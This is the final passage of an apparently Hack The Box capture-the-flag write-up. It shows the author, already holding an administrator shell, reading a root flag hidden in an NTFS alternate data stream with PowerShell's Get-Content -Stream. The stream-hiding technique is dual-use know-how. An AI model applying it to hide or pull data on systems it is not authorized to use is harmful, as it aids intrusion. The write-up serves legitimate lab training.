```bash
PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt:flag.txt
```

How obvious... The ADS for `root.txt` is `flag.txt`. With this in mind, we're finally able to view the root flag!

```bash
PS C:\Users\Administrator\Desktop> Get-Content -Force -Path root.txt -Stream flag.txt
Get-Content -Force -Path root.txt -Stream flag.txt
6d29b069d4de8<redacted>
```
<div align="center">
	<h3> Thanks for reading! </h3>
</div>
<div align="center">
<!-- add the button! -->
<applause-button style="width: 58px; height: 58px;" color="#5d4d7a" url="https://defarbs.com/htb-hackback"/>
</div>
<div align="center">
	<a href="https://www.hackthebox.eu/profile/39047">
		<img htb-logo="image" src="https://www.hackthebox.eu/badge/image/39047" alt="Hack The Box">
	</a>
</div>
